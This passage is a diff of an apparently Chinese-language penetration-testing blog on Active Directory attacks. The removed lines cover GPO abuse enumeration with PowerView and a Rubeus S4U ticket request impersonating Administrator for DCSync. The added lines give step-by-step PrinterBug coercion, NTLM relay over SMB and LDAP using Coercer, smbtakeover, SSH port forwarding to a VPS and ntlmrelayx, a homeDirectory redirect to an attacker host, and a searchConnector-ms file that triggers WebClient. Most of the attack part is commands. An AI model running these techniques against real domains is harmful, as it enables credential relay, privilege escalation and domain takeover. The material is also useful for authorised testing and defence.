-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Set-MachineAccountAttribute</span> <span class="literal">-MachineAccount</span> <span class="string">&quot;TEST01&quot;</span> <span class="literal">-Value</span> <span class="string">&quot;TEST01&quot;</span> <span class="literal">-Attribute</span> samaccountname <span class="literal">-Domain</span> <span class="number">123</span>.com <span class="literal">-DomainController</span> dc.<span class="number">123</span>.com <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/61.png" alt="61"></p>
-<p>最后一步是使用我们通过 TEST01 凭据和 DC 计算机名创建的票据。我们将请求一个服务票据，冒充管理员并添加我们想要使用的任何服务。在这种情况下，我们添加了选项 &#x2F;altservice:ldap&#x2F;dc03.inlanefreight.local，因为我们计划执行 DCSync 操作，而执行该操作需要使用 LDAP 服务：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:<span class="string">&quot;ldap/dc.123.com&quot;</span> /dc:dc.<span class="number">123</span>.com /ptt /ticket:doIEsjC</span><br></pre></td></tr></table></figure>
-
-<h1><span id="introduction-to-gpos">Introduction to GPOs</span></h1><p>在 Windows 环境中，特别是对于管理数百或数千台主机的组织来说，实现一套标准化的安全设置和自定义配置在所有计算机上变得至关重要。管理员不再需要单独配置每台计算机，而是使用 组策略管理控制台（GPMC）。GPMC 使得这些配置可以集中管理，并根据特定的计算机或用户属性进行应用。</p>
-<p>例如，管理员可以通过 GPMC 修改桌面背景、设置特定的安全设置，并应用通常在每台 Windows 机器上手动完成的配置。组策略对象（GPO） 使这种集中管理成为可能。</p>
-<h2><span id="group-policy-object-gpo">Group Policy Object (GPO)</span></h2><p>组策略对象（GPO）是一个包含策略设置的集合，定义了组织内特定用户或计算机组的系统外观和行为。</p>
-<p><img src="/images/62.png" alt="62"></p>
-<p>组策略对象（GPO）由两个主要组成部分构成，它们促进了 GPO 的实现：</p>
-<ol>
-<li><strong>组策略容器（GPC）</strong>：这是一个 LDAP 对象，代表了 GPO 本身，包括其配置和权限设置。GPC 的 <strong>distinguished name</strong> 包含一个唯一的 <strong>GUID</strong>，该 GUID 用于标识 GPO，例如： <code>CN=&#123;GUID&#125;,CN=Policies,CN=System,DC=inlanefreight,DC=local</code>。</li>
-<li><strong>组策略模板（GPT）</strong>：与保存配置元数据的 GPC 不同，GPT 包含实际的设置和配置，这些设置以文件的形式存储在域控制器上的 <strong>SYSVOL</strong> 目录中。这些文件决定了要应用的策略，并由客户端计算机获取。路径通常类似于： <code>\\dc02.inlanefreight.local\SysVol\inlanefreight.local\Policies\&#123;GUID&#125;</code>。</li>
-</ol>
-<p>GPO 通常通过 组织单位（OU） 应用到 Active Directory 环境中的用户和计算机。管理员将组织结构划分为不同的 OU，以便为特定的用户或计算机组量身定制特定的策略。例如，在零售公司中，管理员可能会为销售点（POS）系统设置一个 OU，为 HR、IT、C-level 等部门设置其他 OU。这种结构可以应用针对每个组特定需求的策略。</p>
-<p>注意：组策略设置会在域成员计算机重启时或用户登录域成员计算机时自动更新。此外，组策略会定期刷新，通常每 90 分钟刷新一次，并有一个最多可达 30 分钟的随机偏移。</p>
-<p>从攻击者的角度来看，如果我们获得了账户的访问权限，就可以修改现有的策略或创建新的策略，这使我们能够在任何应用了该策略的计算机上执行代码或进行未经授权的操作。</p>
-<h2><span id="gpo-delegation">GPO Delegation</span></h2><p>要委派权限以将 GPO 链接到站点、域或 OU，您必须拥有该站点、域或 OU 的权限。默认情况下，只有 修改域管理员 和 企业管理员 拥有此权限。管理员通常将这些权限委派给其他部门，如技术支持部门，以便他们能够将所需的策略应用到他们管理的计算机上。管理员可以通过指定哪个 GPO 由指定的组进行修改来完成这一操作。</p>
-<p>如果我们是管理员，并且希望委派 GPO 权限，我们需要使用命令 gpmc.msc 打开 组策略管理控制台（GPMC）；在 GPMC 中，我们可以导航到选定的 GPO（例如 默认安全策略 - WKS），进入 委派 标签页，然后添加我们希望赋予权限的组或账户，指定其权限为 编辑设置 或 编辑设置、删除和修改安全性。</p>
-<p><img src="/images/63.png" alt="63"></p>
-<p>从高层次的角度来看，以下是这些权限可以执行的操作：</p>
+<h2><span id="ms-rprn-abuse-printerbug">MS-RPRN abuse (PrinterBug)</span></h2><h3><span id="理论">理论</span></h3><p>微软的打印后台处理程序（Print Spooler）是一个处理打印任务和与打印相关的其他各种任务的服务。攻击者控制域用户&#x2F;计算机后，可以通过特定的 RPC 调用触发目标机器上的打印后台处理程序服务，使其进行身份验证，并将身份验证请求发送到攻击者选择的目标。这个漏洞被标记为“不会修复”，并且在所有 Windows 环境中默认启用（更多信息请见发现报告）。</p>
+<p>被强制的身份验证通过 SMB 协议进行。但 MS-RPRN 滥用可以与 WebClient 滥用结合，促使通过 HTTP 发起的传入身份验证，这增强了 NTLM 中继攻击的能力。</p>
+<p>目前已知的利用接口：</p>
 <ul>
-<li><strong>编辑设置</strong> 允许用户或组修改 GPO 的属性或设置。</li>
-<li><strong>编辑设置、删除和修改安全性</strong> 允许修改 GPO 设置、删除 GPO，并委派其他用户来管理该GPO。</li>
+<li><strong>RpcRemoteFindFirstPrinterChangeNotificationEx</strong></li>
 </ul>
-<h2><span id="gpo-links">GPO Links</span></h2><p>GPO 本质上是一组规则，用于有效管理计算机和用户账户。然而，创建 GPO 并不会自动应用它。它会处于孤立状态，直到我们将其链接到 Active Directory（AD）结构中的某些部分，如站点、域或组织单位（OU）。这种链接会激活 GPO 的规则，并使其应用于这些容器中的用户和计算机。</p>
-<p>我们首先需要决定这些策略应该应用到哪里。如果有些设置需要影响整个网络，我们将 GPO 链接到 域级别。对于更具体的设置，例如只影响营销部门或某个区域办公室的设置，我们会将 GPO 链接到相应的 OU 或 站点。这种灵活性使我们能够在组织的不同区域应用相同的策略，而无需多次创建 GPO。</p>
-<h3><span id="how-the-order-of-gpos-impacts-application">How the Order of GPOs Impacts Application</span></h3><p>理解 GPO 处理顺序是至关重要的，特别是当多个 GPO 被链接到同一个 AD 容器时。如果策略之间发生冲突（例如，一个 GPO 禁用某个设置，而另一个启用它），最后处理的 GPO 将优先应用。这个顺序首先由 位置（本地、站点、域、OU）决定，然后在这些级别内通过 链接顺序（Link Order）来指定每个级别上 GPO 应用的层次结构。</p>
-<p>我们可以将 GPO 链接到站点、域或 OU。当我们链接 GPO 时，它会按照特定顺序执行，确保离用户或计算机更近的策略具有最高优先级。以下是 GPO 应用的顺序：</p>
-<ol>
-<li>本地</li>
-<li>站点</li>
-<li>域</li>
-<li>组织单位（OU）</li>
-</ol>
-<p>此外，如果我们将多个 GPO 应用到站点、域或 OU，这些 GPO 会有一个 链接顺序，意味着在每个级别上，我们可以指定每个策略应用的层次顺序。</p>
-<p><img src="/images/64.png" alt="64"></p>
-<p>另一个需要考虑的因素是，有时我们需要某些策略普遍适用且没有例外。在这种情况下，我们可以 强制执行 GPO。即使一个下级的 OU 配置为阻止继承（通常会阻止更高层级的策略设置应用于该 OU），被强制执行的 GPO 仍然会生效。</p>
-<h2><span id="example-scenario-local-gpo-vs-ou-linked-gpo">Example Scenario: Local GPO vs. OU Linked GPO</span></h2><p>现在，为了更好地理解 GPO 是如何应用的，假设我们需要启用 Windows 防火墙。我们直接在计算机上使用本地 GPO 来启用 Windows 防火墙。这个本地 GPO 是系统启动时或在进行组策略刷新时应用的第一级策略。</p>
-<p>在这个场景中，我们还可以看到该计算机是 Workstations 这个 OU 的成员，而该 OU 上有一个 GPO 被链接到该 OU，并禁用 Windows 防火墙。以下是策略应用时的流程：</p>
-<ol>
-<li><strong>本地 GPO 应用</strong>：计算机在启动时首先应用本地 GPO。根据我们的设置，这个 GPO 启用了 Windows 防火墙。</li>
-<li><strong>站点 GPO 应用</strong>：接下来，如果有任何链接到该计算机所在站点的 GPO，这些 GPO 会被应用。站点链接的 GPO 可以修改本地 GPO 应用的设置。</li>
-<li><strong>域 GPO 应用</strong>：在应用了站点链接的 GPO 后，任何链接到域并包含该计算机的 GPO 会被应用。这些 GPO 也可以覆盖本地和站点链接 GPO 中的设置。</li>
-<li><strong>OU GPO 应用</strong>：最后，链接到 OU 的 GPO 会被应用。在我们的场景中，这个 GPO 禁用了 Windows 防火墙。由于 OU 链接的 GPO 是最后处理的（在本地、站点和域的 GPO 之后），它们在这个上下文中具有最高优先级，除非某个更高级别的 GPO 被强制执行。</li>
-</ol>
-<p>注意：在任何级别上强制执行 GPO 可确保它的设置优先于在层次结构中较早处理的任何冲突设置。</p>
-<p>注意：如果我们将 OU 设置为阻止继承，它将不会接收来自域或站点级别的任何 GPO，除非这些 GPO 是被强制执行的。然而，本地 GPO 仍然会被应用，因为它们在 AD 基于的 GPO 之前被处理，并且被视为与 AD 层次结构独立的。</p>
-<p>这种结构化的方式让管理员可以对策略应用进行显著的控制，但同时也为我们作为攻击者提供了一个妥协网络的机会。如果我们妥协了具有修改 GPO 权限、创建 GPO 或将现有 GPO 链接到站点、域或 OU 的账户，我们可以利用这些权限来妥协任何应用了该 GPO 的计算机。</p>
-<h1><span id="gpo-attacks">GPO Attacks</span></h1><p>现在我们理解了 GPO 的工作原理，接下来我们讨论一下可以被滥用来提升权限或横向移动的 GPO 权限类型。</p>
-<p>第一种可以被滥用的权限是 修改 GPO 的权限。如前所述，管理员可以将管理 GPO 的权限委派给其他用户或计算机。如果我们妥协了一个具有 GPO 委派权限的账户，我们可以滥用这些权限来修改 GPO。修改的内容可能包括执行命令或在所有应用该 GPO 的计算机上执行操作。</p>
-<p>我们还需要访问的另一个权限是 链接 GPO 的权限。如果我们获得了一个具有链接 GPO 权限的账户，我们可以利用它将 GPO 链接到站点、域或 OU。仅仅拥有这个权限本身并不能提供提升权限的路径，因为我们还需要有修改 GPO 或创建新 GPO 的权限来进行链接。如果我们获得了可以创建或修改现有 GPO 的账户，记住这个权限就变得非常重要。</p>
-<p>最后，如果我们妥协了一个具有 创建 GPO 权限 的账户，并将其与将 GPO 链接到站点、域或 OU 的能力结合起来，我们就能够妥协任何属于我们链接该 GPO 的站点、域或 OU 的计算机。</p>
-<p>本节将探讨如何从 Linux 和 Windows 中枚举和滥用 GPO 权限。</p>
-<h2><span id="gpo-enumeration">GPO Enumeration</span></h2><p>在处理 GPO 时，我们需要了解其名称、OU（链接 GPO 的常用位置）、链接位置以及与之相关的 DACL。</p>
-<p>作为攻击者，当我们以 GPO 为目标时，我们要列举四件具体事情：</p>
-<ul>
-<li>哪些非管理员用户可以修改 GPO？我们这样做是为了筛选出我们想要攻击的 GPO 和目标账户。</li>
-<li>这些 GPO 链接到哪里？如我们所学，GPO 只有在链接后才会应用；我们需要了解 GPO 的链接位置，以识别哪些设备可以通过这些 GPO 进行攻击。</li>
-<li>哪些非管理员用户可以链接 GPO？我们希望了解在哪些地方可以应用我们控制的 GPO，具体来说就是检查我们是否拥有将 GPO 链接到站点、域或 OU 的权限。</li>
-<li>哪些非管理员用户可以创建 GPO？</li>
+<h3><span id="利用">利用</span></h3><p>使用netexec探测漏洞是否存在</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali netexec smb 192.168.1.1 -u 123 -p 123 -M printerbug</span><br></pre></td></tr></table></figure>
+
+<p>使用Coercer触发强制认证</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali proxychains python3 Coercer.py coerce --auth-type smb --filter-protocol-name MS-RPRN -u <span class="string">&#x27;123&#x27;</span> -p <span class="string">&#x27;123&#x27;</span> -d 123.com -t 123.123.com -l 1234.1234.com</span><br></pre></td></tr></table></figure>
+
+<h1><span id="ntlm-relay-over-smb-attack">NTLM Relay over SMB Attack</span></h1><h2><span id="场景">场景</span></h2><ul>
+<li>拥有域内一台Windows机器的权限，出网</li>
+<li>对域内某个用户有修改homeDirectory或者profilePath属性的权限</li>
+<li>一台没有启用smb签名的机器（目标）</li>
 </ul>
-<p>让我们看看如何在 Windows 和 Linux 中枚举这些权限。</p>
-<h2><span id="gpo-enumeration-from-windows">GPO Enumeration from Windows</span></h2><p>我们可以使用 PowerView、Microsoft 的 GroupPolicy 模块或 BloodHound 来枚举 GPO。我们将重点讨论 PowerView。</p>
-<p>注意：我们可以使用 PowerView、Active Directory 模块、BloodHound 来执行部分枚举任务，但并不是所有信息都能在 BloodHound 中显示。</p>
-<p>要获取域中的 GPO，我们可以使用 <code>Get-DomainGPO</code> 命令。该命令将检索当前域中创建的所有 GPO。我们将以第一个 GPO 为例进行操作，但也可以对域中的每个 GPO 执行相同的操作。</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainGPO</span> <span class="literal">-server</span> dc.<span class="number">123</span>.com | <span class="built_in">Select-Object</span> <span class="literal">-First</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<h2><span id="利用">利用</span></h2><h3><span id="通过smbtakeover接管445端口">通过smbtakeover接管445端口</span></h3><p>一定要确认没有人使用该机器的smb服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali proxychains python3 smbtakeover.py -hashes :123123123123123123123 123.com/administrator@192.168.1.2 stop</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/65.png" alt="65"></p>
-<p>让我们分解一些在攻击 GPO 时需要关注的 GPO 属性：</p>
-<p>以下是一个关于 GPO 属性的表格：</p>
-<table>
-<thead>
-<tr>
-<th><strong>属性</strong></th>
-<th><strong>描述</strong></th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>displayname</strong></td>
-<td>GPO 在工具（如组策略管理控制台 GPMC）中显示的名称，管理员用来在域中识别 GPO。</td>
-</tr>
-<tr>
-<td><strong>name</strong></td>
-<td>GPO 的唯一标识符，通常为 GUID，用于在 Active Directory 和 GPMC 内部唯一标识该 GPO。</td>
-</tr>
-<tr>
-<td><strong>objectguid</strong></td>
-<td>分配给 GPO 的全局唯一标识符（GUID），用于在整个 Active Directory 中唯一引用 GPO。</td>
-</tr>
-<tr>
-<td><strong>Description</strong></td>
-<td>GPO 的描述，通常用于提供有关 GPO 目的或用途的附加信息。</td>
-</tr>
-<tr>
-<td><strong>gpcfilesyspath</strong></td>
-<td>域控制器上的 SYSVOL 共享中包含 GPO 数据的文件夹路径，负责 GPO 数据的域内复制。</td>
-</tr>
-</tbody></table>
-<p>如果我们想列出所有 GPO 的名称，可以使用以下 PowerShell 命令：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainGPO</span> <span class="literal">-server</span> dc.<span class="number">123</span>.com <span class="literal">-Properties</span> displayname</span><br></pre></td></tr></table></figure>
+<p><img src="/images/24.png" alt="24"></p>
+<h3><span id="通过任意方式将该机器的445端口的流量转发到远程机器">通过任意方式将该机器的445端口的流量转发到远程机器</span></h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:&gt; <span class="title">netsh</span> <span class="title">interface</span> <span class="title">portproxy</span> <span class="title">add</span> <span class="title">v4tov4</span> <span class="title">listenport</span>=445 <span class="title">listenaddress</span>=0.0.0.0 <span class="title">connectport</span>=8445 <span class="title">connectaddress</span>=127.0.0.1</span></span><br><span class="line"><span class="function"><span class="title">C</span>:&gt; <span class="title">ssh.exe</span> -<span class="title">o</span> <span class="title">StrictHostKeyChecking</span>=<span class="title">no</span> -<span class="title">fNCg</span> -<span class="title">L</span> 8445:127.0.0.1:8445 <span class="title">user</span>@<span class="title">remoteaddr</span> -<span class="title">p</span> 22 -<span class="title">i</span> <span class="title">key</span></span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/66.png" alt="66"></p>
-<p>现在，我们需要了解这些 GPO 是在哪里链接的。提供该信息的 Active Directory 属性是 gplink。我们需要查询站点、域和每个组织单位（OU）以获取该属性。让我们从域级别开始：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainObject</span> <span class="literal">-server</span> dc.<span class="number">123</span>.com <span class="literal">-SearchScope</span> Base <span class="literal">-Properties</span> gplink</span><br></pre></td></tr></table></figure>
+<h3><span id="在攻击机器上使用远程端口转发将远程端口的流量转发到本地">在攻击机器上使用远程端口转发，将远程端口的流量转发到本地</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali ssh -fNC -R 127.0.0.1:8445:127.0.0.1:445 user@remoteaddr -p 22 -i key.pem</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/67.png" alt="67"></p>
-<p>输出结果提供了一个 LDAP 路径，其中包含 Default Domain Policy 的 GUID，这表明该 GPO 链接到域级别。该 GPO 在 Active Directory 对象中的位置是：cn&#x3D;policies,cn&#x3D;system,DC&#x3D;inlanefreight,DC&#x3D;local。</p>
-<p>分号后面的数字表示链接选项，这些选项决定了 GPO 如何根据该链接的状态应用。以下是可能的值及其含义：</p>
-<ul>
-<li><strong>0</strong> - GPO 启用。</li>
-<li><strong>1</strong> - GPO 禁用。</li>
-<li><strong>2</strong> - GPO 链接已强制执行。</li>
-<li><strong>3</strong> - GPO 链接已强制执行，但 GPO 被禁用。</li>
+<h3><span id="在本地启动ntlmrelayx">在本地启动ntlmrelayx</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali proxychains impacket-ntlmrelayx -smb2support -t 192.168.1.5</span><br></pre></td></tr></table></figure>
+
+<h3><span id="修改用户的homedirectory">修改用户的homeDirectory</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  kali proxychains ldapmodify -x -H ldap://192.168.1.1:389 -D <span class="string">&#x27;administrator@root.local&#x27;</span> -w <span class="string">&#x27;ThisisPassw0rd!&#x27;</span> -f modify_user.ldif</span><br><span class="line"></span><br><span class="line">dn: CN=somebody,CN=Users,DC=123,DC=com</span><br><span class="line">changetype: modify</span><br><span class="line">replace: homeDirectory</span><br><span class="line">homeDirectory: //192.168.1.4/fdgdsgdsg</span><br></pre></td></tr></table></figure>
+
+<h3><span id="用户登录机器触发认证">用户登录机器触发认证</span></h3><p><img src="/images/25.png" alt="25"></p>
+<h1><span id="ntlm-relay-over-ldap-attack">NTLM Relay over LDAP Attack</span></h1><p>由于域控默认是开启了smb签名的，所以从smb中继到ldap一般来说是不太可行的，由于有的强制认证漏洞支持\\192.168.1.1@80的webdav的形式字符串，于是我们可以从http中继到ldap</p>
+<h2><span id="场景可以加机器">场景（可以加机器）</span></h2><ul>
+<li><p>一台启用了WebClient服务的机器（触发强制认证的目标）</p>
+</li>
+<li><p>域控</p>
+</li>
+<li><p>拥有域内一台Windows机器的权限，出网</p>
+</li>
+<li><p>拥有一个机器账户或者可以创建一个机器账户</p>
+</li>
 </ul>
-<p>接下来，我们需要了解哪些用户有权修改该 GPO。我们可以通过管道命令 <code>Get-DomainObjectAcl</code> 来获取有关影响 GPO 的 <strong>ActiveDirectoryRights</strong> 的信息。我们将仅查找诸如 <strong>CreateChild</strong>、<strong>WriteProperty</strong>、<strong>WriteDacl</strong>、<strong>WriteOwner</strong> 等权限，并且只搜索 <strong>SecurityIdentifier</strong> 大于 1000 的条目，这意味着任何默认的组（如管理员、域管理员等）将被排除。因为我们只关注非管理员用户，这些账户是我们可以攻击的目标。</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainGPO</span> | <span class="built_in">Select-Object</span> <span class="literal">-First</span> <span class="number">1</span> | <span class="built_in">Get-DomainObjectAcl</span> <span class="literal">-server</span> dc.<span class="number">123</span>.com | <span class="built_in">where</span> &#123; <span class="variable">$_</span>.ActiveDirectoryRights <span class="operator">-match</span> <span class="string">&quot;CreateChild|WriteProperty|DeleteChild|DeleteTree|WriteDacl|WriteOwner&quot;</span> <span class="operator">-and</span> <span class="variable">$_</span>.SecurityIdentifier <span class="operator">-match</span> <span class="string">&#x27;^S-1-5-.*-[1-9]\d&#123;3,&#125;$&#x27;</span> &#125;</span><br></pre></td></tr></table></figure>
+<h4><span id="注意">注意</span></h4><p>个人机器默认会安装webclient服务但是默认没有启动，可以上传<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry">searchConnector-ms</a>文件，当目标浏览包含该文件的文件夹时会触发webclient服务的启动</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt; &lt;searchConnectorDescription xmlns=<span class="string">&quot;http://schemas.microsoft.com/windows/2009/searchConnector&quot;</span>&gt; &lt;iconReference&gt;imageres.dll,-1002&lt;/iconReference&gt; &lt;description&gt;Microsoft Outlook&lt;/description&gt; &lt;isSearchOnlyItem&gt;<span class="literal">false</span>&lt;/isSearchOnlyItem&gt; &lt;includeInStartMenuScope&gt;<span class="literal">true</span>&lt;/includeInStartMenuScope&gt; &lt;iconReference&gt;https://&lt;strong&gt;&lt;em&gt;www.google.com&lt;/em&gt;&lt;/strong&gt;/0001.ico&lt;/iconReference&gt; &lt;templateInfo&gt; &lt;folderType&gt;&#123;91475FE5-586B-4EBA-8D75-D17434B8CDF6&#125;&lt;/folderType&gt; &lt;/templateInfo&gt; &lt;simpleLocation&gt; &lt;url&gt;https://&lt;strong&gt;&lt;em&gt;www.google.com&lt;/em&gt;&lt;/strong&gt;/&lt;/url&gt; &lt;/simpleLocation&gt; &lt;/searchConnectorDescription&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/68.png" alt="68"></p>
-<p>最后，我们将 SecurityIdentifier 或 SID 转换为相应的账户或组名：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">ConvertFrom-SID</span> S<span class="literal">-1-5-21-1409082233-123123213-123123123-9672</span> <span class="literal">-server</span> dc.<span class="number">123</span>.com</span><br></pre></td></tr></table></figure>
+<h3><span id="使用netexec找webclient服务开启的机器">使用netexec找webclient服务开启的机器</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali proxychains netexec smb 192.168.1.1/24 -u 123 -p <span class="string">&quot;123&quot;</span> -M webdav</span><br></pre></td></tr></table></figure>
 
-<p>查询用户或者组的详细信息：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainObject</span> <span class="literal">-identity</span> <span class="number">123</span> <span class="literal">-server</span> dc.<span class="number">123</span>.com</span><br></pre></td></tr></table></figure>
+<p><img src="/images/26.png" alt="26"></p>
+<h3><span id="然后查看其是否存在强制认证漏洞">然后查看其是否存在强制认证漏洞</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali netexec smb 192.168.1.6 -u 123 -p <span class="string">&quot;123&quot;</span> -M petitpotam</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/69.png" alt="69"></p>
-<p>有了这些信息，我们可以应用相同的逻辑来搜索站点（Sites）和组织单位（OUs）中的 gplink 属性。要在站点中搜索 gplink，我们可以使用以下命令：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-DomainSite</span> <span class="literal">-Properties</span> gplink</span><br></pre></td></tr></table></figure>
+<p><img src="/images/27.png" alt="27"></p>
+<h3><span id="确定域控的ldaps没有启用-channel-binding">确定域控的ldaps没有启用 Channel Binding</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali proxychains python3 LdapRelayScan.py -dc-ip 192.168.1.1 -u administrator -nthash 123123123123123</span><br></pre></td></tr></table></figure>
 
-<p>要检索组织单位（OUs）的 gplink，我们可以使用以下命令：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainOU</span> <span class="literal">-server</span> dc.<span class="number">123</span>.com | <span class="built_in">select</span> name, gplink</span><br></pre></td></tr></table></figure>
+<p><img src="/images/28.png" alt="28"></p>
+<h3><span id="将已控的出网的windows的8081端口的流量转到vps上">将已控的出网的windows的8081端口的流量转到vps上</span></h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Windows</span>\<span class="title">system32</span>&gt; <span class="title">netsh</span> <span class="title">advfirewall</span> <span class="title">firewall</span> <span class="title">add</span> <span class="title">rule</span> <span class="title">name</span>=&quot;8081&quot; <span class="title">dir</span>=<span class="title">in</span> <span class="title">action</span>=<span class="title">allow</span> <span class="title">protocol</span>=<span class="title">TCP</span> <span class="title">localport</span>=8081</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">system32</span>&gt; <span class="title">ssh.exe</span> -<span class="title">o</span> <span class="title">StrictHostKeyChecking</span>=<span class="title">no</span> -<span class="title">fNC</span> -<span class="title">L</span> 192.168.1.4:8081:127.0.0.1:8081 <span class="title">user</span>@<span class="title">remoteaddr</span> -<span class="title">p</span> 22 -<span class="title">i</span> .\<span class="title">key.pem</span></span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/70.png" alt="70"></p>
-<p>注意：多个 GPO 可以应用于同一个站点（Site）、域（Domain）或组织单位（OU）。</p>
-<p>根据 OU 的信息，我们可以使用以下 PowerView 命令查询位于这些 OU 内的计算机：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-DomainOU</span> <span class="literal">-server</span> plwinpdc.plho.com | <span class="built_in">ForEach-Object</span> &#123; </span><br><span class="line">    <span class="variable">$ou</span> = <span class="string">&quot;LDAP://dc.123.com/&quot;</span> + <span class="variable">$_</span>.distinguishedname</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 打印 $ou 变量的值</span></span><br><span class="line">    <span class="built_in">Write-Host</span> <span class="string">&quot;正在查询的 OU: <span class="variable">$ou</span>&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">Get-DomainComputer</span> <span class="literal">-SearchBase</span> <span class="variable">$ou</span> <span class="literal">-Properties</span> dnshostname | </span><br><span class="line">    <span class="built_in">Select-Object</span> <span class="selector-tag">@</span>&#123;Name=<span class="string">&#x27;OU&#x27;</span>;Expression=&#123;<span class="variable">$ou</span>&#125;&#125;, <span class="selector-tag">@</span>&#123;Name=<span class="string">&#x27;FQDN&#x27;</span>;Expression=&#123;<span class="variable">$_</span>.dnshostname&#125;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3><span id="将vps的流量转发到攻击机器">将vps的流量转发到攻击机器</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali ssh -fNC -R 127.0.0.1:8081:127.0.0.1:80 user@remoteaddr -p 22 -i key.pem</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/71.png" alt="71"></p>
-<h2><span id="create-and-link-gpos">Create and Link GPOs</span></h2><p>现在我们可以列出 GPO 并枚举这些 GPO 被链接的位置，接下来我们需要确定谁有权限创建 GPO 以及谁可以将 GPO 链接到站点、域或组织单位（OU）。</p>
-<h3><span id="searching-for-users-with-rights-to-create-gpos">Searching for users with rights to Create GPOs</span></h3><p>要确定哪些用户可以创建 GPO，我们需要枚举 GPO 在域中存储的位置，即 <code>CN=Policies,CN=System,DC=inlanefreight,DC=local</code>。 任何拥有 <code>Create groupPolicyContainer objects</code> 权限的用户或组都能够创建新的 GPO。我们可以使用 <code>Get-DomainGPO</code> 命令提取存储 GPO 的位置的 distinguishedName，然后使用 <code>Get-DomainObjectAcl</code> 查询是否具有 <code>CreateChild</code> 权限。 最后，我们将 SID 转换为对应的主体名称。</p>
